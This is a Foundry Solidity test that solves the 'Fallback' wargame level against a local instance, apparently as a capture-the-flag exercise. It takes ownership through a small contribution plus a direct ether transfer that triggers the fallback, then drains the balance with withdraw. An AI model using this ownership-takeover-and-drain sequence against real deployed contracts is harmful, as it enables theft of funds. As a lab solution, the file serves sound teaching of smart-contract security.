// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {Fallback} from "../src/01_Fallback.sol";

contract TestFallback is Test {
    address public player = address(0xbad);
    Fallback public instance;

    function setUp() public {
        instance = new Fallback();
        vm.deal(player, 0.001 ether);
    }

    function testSolution() public {
        vm.startPrank(player);

        console.log("owner: ", instance.owner());
        console.log("player: ", player);

        instance.contribute{value: 1}();
        console.log("contributions: ", instance.getContribution());

        address(instance).call{value: 1}("");
        instance.withdraw();

        assertEq(instance.owner(), player);
        assertEq(address(instance).balance, 0);

        vm.stopPrank();
    }
}
